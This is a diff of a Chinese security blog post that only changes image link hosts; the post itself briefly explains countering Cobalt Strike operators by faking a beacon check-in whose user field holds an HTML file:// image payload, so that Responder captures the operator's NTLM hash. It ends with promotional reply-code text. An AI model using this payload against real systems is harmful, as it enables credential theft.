@@ -16,13 +16,13 @@ ___发表于_
 
 来自 Jas502n大佬的思路  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923181026.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181026.png)
 
   
 
 使用此工具建立监听：https://github.com/lgandx/Responder
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923181029.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181029.png)
 
   
 
@@ -30,23 +30,23 @@ https://github.com/Sentinel-One/CobaltStrikeParser/
 
 修改 comm.py 第39行，为payload：<html>< img src='file://x.x.x.x/xx'%>
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923181030.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181030.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923181032.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181032.png)
 
 伪造上线  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923181032.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181032.png)
 
 CS上线，user 处为我们设置的 payload  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923181034.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181034.png)
 
   
 
 Responder 脚本抓到客户机 hash
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923181035.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181035.png)
 
 微信公众号渗透测试网络安全后台回复“ **224420** ”获取
 
@@ -58,8 +58,8 @@ Responder 脚本抓到客户机 hash
   
 关注本公众号回复“718619”可以免费领取全套网络安全学习教程，安全靶场、面试指南、安全沙龙PPT、代码安全、火眼安全系统等
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923181036.png)
-还在等什么？赶紧点击下方名片关注学习吧！![](https://gitee.com/fuli009/images/raw/master/public/20220923181036.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181036.png)
+还在等什么？赶紧点击下方名片关注学习吧！![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923181036.png)
 
 分享收藏
 
